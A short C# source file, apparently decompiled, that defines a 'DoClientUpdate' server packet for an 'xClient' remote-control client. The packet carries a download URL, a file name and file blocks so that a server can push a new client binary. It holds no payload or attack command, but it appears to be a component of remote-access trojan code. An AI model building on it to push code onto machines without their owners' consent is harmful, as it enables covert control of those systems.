using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoClientUpdate : GInterface4
{
	public int ID { get; set; }

	public string DownloadURL { get; set; }

	public string FileName { get; set; }

	public byte[] Block { get; set; }

	public int MaxBlocks { get; set; }

	public int CurrentBlock { get; set; }

	public DoClientUpdate()
	{
	}

	public DoClientUpdate(int id, string downloadurl, string filename, byte[] block, int maxblocks, int currentblock)
	{
		ID = id;
		DownloadURL = downloadurl;
		FileName = filename;
		Block = block;
		MaxBlocks = maxblocks;
		CurrentBlock = currentblock;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
